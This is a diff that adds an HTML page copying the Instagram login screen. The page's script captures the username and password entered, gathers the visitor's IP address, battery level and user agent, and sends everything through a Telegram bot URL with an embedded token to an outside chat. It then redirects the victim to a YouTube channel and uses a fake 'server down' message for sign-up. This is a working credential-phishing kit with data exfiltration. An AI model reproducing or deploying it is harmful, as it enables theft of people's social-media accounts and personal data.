@@ -1,1 +1,151 @@
-login into instagram and join us
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #fafafa;
+            margin: 0;
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .login-container {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            width: 350px;
+            padding: 40px;
+            box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .login-container img {
+            width: 175px;
+            margin-bottom: 20px;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            background-color: #fafafa;
+            box-sizing: border-box;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #3897f0;
+            border: none;
+            color: white;
+            font-size: 14px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .login-container button:hover {
+            background-color: #287bb5;
+        }
+        .signup-container {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            width: 350px;
+            padding: 20px;
+            text-align: center;
+        }
+        .signup-container p {
+            margin: 0;
+            font-size: 14px;
+        }
+        .signup-container a {
+            color: #3897f0;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram">
+            <form id="loginForm">
+                <input type="text" id="username" name="username" placeholder="Username" required>
+                <input type="password" id="password" name="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+            </form>
+        </div>
+        <div class="signup-container">
+            <p>Don't have an account? <a href="#" id="signupLink">Sign up</a></p>
+        </div>
+    </div>
+
+    <script>
+        // Function to get the IP address
+        function getIPAddress() {
+            return fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => data.ip);
+        }
+
+        // Function to get the device information
+        function getDeviceInfo() {
+            return navigator.userAgent;
+        }
+
+        // Function to get the battery charge level
+        function getBatteryInfo() {
+            return navigator.getBattery().then(function(battery) {
+                return battery.level * 100 + '%';
+            });
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            Promise.all([getIPAddress(), getBatteryInfo()]).then(values => {
+                var ip = values[0];
+                var battery = values[1];
+                var deviceInfo = getDeviceInfo();
+
+                var message = `
+USER NAME: ${username}
+PASSWORD: ${password}
+IP ADDRESS: ${ip}
+BATTERY: ${battery}
+DEVICE INFO: ${deviceInfo}`;
+
+                var url = `https://api.telegram.org/bot7215613695:AAE0WOU3s0CoFYY_0tF3VHF14mc6Cd_wftk/sendMessage?chat_id=6300206674&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+                fetch(url)
+                    .then(response => {
+                        if (response.ok) {
+                            window.location.href = 'https://youtube.com/@swapnilbhattacharya-re8fr?si=DFqQz5k1mcbkuFV3';
+                        } else {
+                            alert('Failed to send login information.');
+                        }
+                    })
+                    .catch(error => {
+                        alert('Error: ' + error);
+                    });
+            });
+        });
+
+        document.getElementById('signupLink').addEventListener('click', function(event) {
+            event.preventDefault();
+            alert('Oh sorry our server is down so please try again later');
+        });
+    </script>
+</body>
+</html>
